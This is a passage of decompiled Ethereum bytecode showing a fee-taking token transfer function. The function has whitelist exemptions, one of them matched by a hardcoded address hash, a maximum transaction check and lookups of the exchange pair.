                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 6
                        if stor6[address(msg.sender)]:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7203 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7203 + 32 len mem[_7203]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7123 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7141 = mem[_7123]
                            require mem[_7123] == mem[_7123 + 12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7189 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7224 = mem[_7189]
                            require mem[_7189] == mem[_7189 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_7224)
                            require ext_code.size(address(_7141))
                            staticcall address(_7141).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_7224)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _7396 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _7468 = mem[_7396]
                            require mem[_7396] == mem[_7396 + 12 len 20]
                            if mem[_7396 + 12 len 20] != msg.sender:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 6
                                    if stor6[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7842 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7842 + 32 len mem[_7842]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_7468):
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor14:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 6
                                    if stor6[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _7868 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if sha3(mem[_7868 + 32 len mem[_7868]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if arg1 == this.address:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor6[address(arg1)]:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor14:
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < 0:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -1:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 'NH{q', 17
                                                            if not arg2:
                                                                revert with 'NH{q', 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor16)
                                                            staticcall stor16.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor15.length++
                                                                stor15[stor15.length].field_0 = arg1
                                                                stor15[stor15.length].field_256 = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 'NH{q', 17
                                                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                                revert with 'NH{q', 17
                                                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100 > 0:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[32] = 3
                    require balanceOf[address(msg.sender)] >= arg2
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor6[address(msg.sender)]:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if arg1 == this.address:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor14:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor16)
                                    staticcall stor16.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor16)
                                    staticcall stor16.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
